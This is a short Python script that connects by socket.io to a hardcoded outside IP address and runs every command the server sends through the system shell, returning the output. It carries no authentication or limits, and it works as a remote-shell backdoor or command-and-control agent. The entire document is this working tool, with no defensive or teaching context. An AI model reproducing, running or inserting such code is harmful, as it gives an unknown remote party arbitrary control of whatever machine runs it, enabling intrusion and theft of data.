import socketio
import subprocess

sio = socketio.Client()

@sio.event
def connect():
    print("Successfully connected to the server.")

@sio.event
def disconnect():
    print("Disconnected from the server.")

@sio.on('execute_command')
def on_execute_command(data):
    command = data['command']
    print(f"Executing command: {command}")
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    sio.emit('command_output', {'output': output})

if __name__ == '__main__':
    sio.connect('http://80.108.95.253:8000/')
    sio.wait()
